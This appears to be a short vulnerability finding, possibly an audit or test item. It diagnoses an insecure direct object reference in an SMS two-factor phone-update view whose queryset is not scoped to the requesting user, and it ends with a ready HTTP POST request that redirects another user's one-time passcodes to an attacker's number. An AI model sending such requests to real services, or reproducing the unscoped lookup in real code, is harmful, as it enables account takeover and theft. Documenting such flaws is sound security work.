diagnosis: SMSDevicePhoneUpdateView accepts a device_id and phone_number in the request body to reconfigure SMS 2FA delivery numbers. Because the queryset filter PhoneDevice.objects.filter(id=device_id) lacks a filter for user=request.user, an attacker can modify the phone number on another user's PhoneDevice record, causing future SMS one-time login passcodes to be routed directly to the attacker's handset.
exploit_request:
POST /mfa/sms/update/ HTTP/1.1
Host: accounts.fintechvault.io
Cookie: sessionid=active_session_cookie
Content-Type: application/json

{"device_id": 340, "phone_number": "+15550192834"}
